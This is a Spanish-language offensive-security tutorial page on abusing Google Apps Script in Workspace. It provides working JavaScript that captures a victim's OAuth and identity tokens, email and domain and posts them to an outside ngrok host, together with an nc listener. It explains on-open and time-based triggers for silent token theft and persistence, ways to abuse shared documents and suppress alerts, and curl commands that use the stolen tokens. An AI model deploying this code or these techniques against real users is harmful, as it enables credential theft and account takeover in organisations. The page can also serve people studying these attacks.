# GWS - App Scripts

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## App Scripts

App Scripts es **c√≥digo que se activar√° cuando un usuario con permiso de editor acceda al documento al que est√° vinculado el App Script** y despu√©s de **aceptar el aviso de OAuth**.\
Tambi√©n pueden configurarse para ser **ejecutados cada cierto tiempo** por el propietario del App Script (Persistencia).

### Crear App Script

Hay varias formas de crear un App Script, aunque las m√°s comunes son **desde un Documento de Google (de cualquier tipo)** y como un **proyecto independiente**:

<details>

<summary>Crear un proyecto vinculado a un contenedor desde Google Docs, Sheets o Slides</summary>

1. Abre un documento de Docs, una hoja de c√°lculo de Sheets o una presentaci√≥n de Slides.
2. Haz clic en **Extensiones** > **Google Apps Script**.
3. En el editor de scripts, haz clic en **Proyecto sin t√≠tulo**.
4. Dale un nombre a tu proyecto y haz clic en **Renombrar**.

</details>

<details>

<summary>Crear un proyecto independiente</summary>

Para crear un proyecto independiente desde Apps Script:

1. Ve a [`script.google.com`](https://script.google.com/).
2. Haz clic en **Nuevo Proyecto**.
3. En el editor de scripts, haz clic en **Proyecto sin t√≠tulo**.
4. Dale un nombre a tu proyecto y haz clic en **Renombrar**.

</details>

<details>

<summary>Crear un proyecto independiente desde Google Drive</summary>

1. Abre [Google Drive](https://drive.google.com/).
2. Haz clic en **Nuevo** > **M√°s** > **Google Apps Script**.

</details>

<details>

<summary>Crear un proyecto vinculado a un contenedor desde Google Forms</summary>

1. Abre un formulario en Google Forms.
2. Haz clic en M√°s more_vert > **Editor de scripts**.
3. En el editor de scripts, haz clic en **Proyecto sin t√≠tulo**.
4. Dale un nombre a tu proyecto y haz clic en **Renombrar**.

</details>

<details>

<summary>Crear un proyecto independiente utilizando la herramienta de l√≠nea de comandos clasp</summary>

`clasp` es una herramienta de l√≠nea de comandos que te permite crear, tirar/empujar y desplegar proyectos de Apps Script desde un terminal.

Consulta la [gu√≠a de Interfaz de L√≠nea de Comandos usando `clasp`](https://developers.google.com/apps-script/guides/clasp) para m√°s detalles.

</details>

## Escenario de App Script <a href="#create-using-clasp" id="create-using-clasp"></a>

### Crear una Hoja de C√°lculo de Google con App Script

Comienza creando un App Script, mi recomendaci√≥n para este escenario es crear una Hoja de C√°lculo de Google y dirigirte a **`Extensiones > App Scripts`**, esto abrir√° **un nuevo App Script vinculado a la hoja para ti**.

### Filtrar token

Para dar acceso al token de OAuth necesitas hacer clic en **`Servicios +` y a√±adir √°mbitos como**:

* **AdminDirectory**: Acceso a usuarios y grupos del directorio (si el usuario tiene suficientes permisos)
* **Gmail**: Para acceder a datos de Gmail
* **Drive**: Para acceder a datos de Drive
* **API de Google Sheets**: Para que funcione con el disparador

Para cambiar t√∫ mismo los **√°mbitos necesarios** puedes ir a la configuraci√≥n del proyecto y **activar `Mostrar archivo de manifiesto "appsscript.json" en el editor`.**

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
```markdown
Para capturar la solicitud, simplemente ejecuta:
```
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permisos solicitados para ejecutar el App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Como se realiza una solicitud externa, el aviso de OAuth tambi√©n **pedir√° permiso para acceder a puntos finales externos**.
{% endhint %}

### Crear Disparador

Una vez que la App est√© lista, haz clic en **‚è∞ Disparadores** para crear un disparador. Como **funci√≥n** a ejecutar elige **`getToken`**, ejecuta en la implementaci√≥n **`Head`**, en fuente del evento selecciona **`Desde hoja de c√°lculo`** y en tipo de evento selecciona **`Al abrir`** o **`Al editar`** (seg√∫n tus necesidades) y guarda.

Ten en cuenta que puedes verificar las **ejecuciones de los App Scripts en la pesta√±a de Ejecuciones** si quieres depurar algo.

### Compartir

Para **activar** el **App Script** la v√≠ctima necesita conectarse con **Acceso de Editor**.

En resumen, si el creador y el usuario invitado son **de la misma organizaci√≥n**, el **token de OAuth** **pertenecer√°** al **usuario** que accede al archivo.\
Si son de **organizaciones diferentes**, el **token** pertenecer√° al **creador del disparador** siempre con **solo los permisos de OAuth otorgados** cuando se cre√≥ el disparador.

{% hint style="success" %}
* Si simplemente generas un **enlace de Editor para compartir con todos**, el App Script se **ejecutar√° con los permisos del creador** del mismo, por lo que no obtendr√°s el token de ning√∫n usuario que lo abra.
* Si **invitas a personas fuera de tu organizaci√≥n**, el **App Script se Ejecuta con los permisos del creador de los disparadores** (robando el token del creador y no del usuario que abri√≥ el documento).
{% endhint %}

{% hint style="danger" %}
* Si invitas a **personas de tu propia empresa, no se les preguntar√° nada sobre los permisos de OAuth** y el App Script se ejecutar√° con SUS permisos de usuario, robando sus tokens.
* Un atacante podr√≠a **a√±adir un App Script a un documento nuevo o existente** que personas de la misma organizaci√≥n van a abrir y **robar tokens de ellos** sin que se den cuenta.
{% endhint %}

### Abusar de documentos Compartidos Conmigo

{% hint style="danger" %}
* Si alguien externo **comparti√≥ contigo un documento con App Scripts y un disparador usando el Head** del App Script (no una implementaci√≥n fija), puedes modificar el c√≥digo del App Script (a√±adiendo por ejemplo las funciones de robo de token), acceder a √©l y el **App Script se ejecutar√° con los permisos del usuario que comparti√≥ el documento contigo** (ten en cuenta que el token de OAuth del propietario tendr√° como √°mbitos de acceso los otorgados cuando se cre√≥ el disparador).
* Si es alguien interno, se ejecutar√° con tus permisos... solo **comp√°rtelo con una persona externa y accede desde el correo electr√≥nico de la persona externa** para ejecutarlo con los permisos del creador.
* Se **enviar√° una notificaci√≥n al creador del script indicando que alguien modific√≥ el script** (¬øQu√© tal usar permisos de gmail para generar un filtro y prevenir la alerta?)
{% endhint %}

{% hint style="success" %}
Si un **atacante modifica los √°mbitos del App Script**, las actualizaciones **no se aplicar√°n** al documento hasta que se cree un **nuevo disparador** con los cambios. Por lo tanto, un atacante no podr√° robar el token del creador del propietario con m√°s √°mbitos de los que estableci√≥ en el disparador que cre√≥.
{% endhint %}

### Copiar en lugar de compartir

Cuando creas un enlace para compartir un documento, se crea un enlace similar a este: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Si **cambias** el final **"/edit"** por **"/copy"**, en lugar de acceder, Google te preguntar√° si quieres **generar una copia del documento:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Si el usuario lo copia y accede, tanto el **contenido del documento como los App Scripts se copiar√°n**, sin embargo, los **disparadores no lo har√°n**, por lo tanto, **nada se ejecutar√°**.

### Compartir como Aplicaci√≥n Web

Ten en cuenta que tambi√©n es posible **compartir un App Script como una Aplicaci√≥n Web** (en el Editor del App Script, despliega como una Aplicaci√≥n Web), pero aparecer√° una alerta como esta:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Seguido del **aviso t√≠pico de OAuth pidiendo** los permisos necesarios.

### Pruebas

Puedes probar un token recopilado para listar correos electr√≥nicos con:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
```markdown
Listar el calendario del usuario:
```
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script como Persistencia

Tambi√©n es posible crear un App Script y hacer que se active cada cierto tiempo (como cada minuto, hora, d√≠a...). Un atacante que haya **comprometido credenciales o una sesi√≥n de una v√≠ctima podr√≠a configurar un disparador de tiempo de App Script y filtrar un token OAuth muy privilegiado todos los d√≠as**:

Solo crea un App Script, ve a Triggers, haz clic en Add Trigger y selecciona como fuente del evento Time-driven y selecciona las opciones que mejor se adapten a ti:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Esto crear√° un correo electr√≥nico de alerta de seguridad y un mensaje push a tu m√≥vil alertando sobre esto.
{% endhint %}



### Bypass de Prompt No Verificado en Documento Compartido

Adem√°s, si alguien **comparti√≥** contigo un documento con **acceso de editor**, puedes generar **App Scripts dentro del documento** y el **PROPIETARIO (creador) del documento ser√° el due√±o del App Script**.

{% hint style="warning" %}
Esto significa que el **creador del documento aparecer√° como creador de cualquier App Script** que cualquier persona con acceso de editor cree dentro de √©l.

Esto tambi√©n significa que el **App Script ser√° confiable por el entorno de Workspace** del creador del documento.
{% endhint %}

{% hint style="danger" %}
Esto tambi√©n significa que si un **App Script ya exist√≠a** y la gente ha **concedido acceso**, cualquiera con permiso de **Editor** en el documento puede **modificarlo y abusar de ese acceso.**\
Para abusar de esto tambi√©n necesitas que la gente active el App Script. Y un truco ingenioso es **publicar el script como una aplicaci√≥n web**. Cuando la **gente** que ya concedi√≥ **acceso** al App Script acceda a la p√°gina web, **activar√°n el App Script** (esto tambi√©n funciona usando etiquetas `<img>`).
{% endhint %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
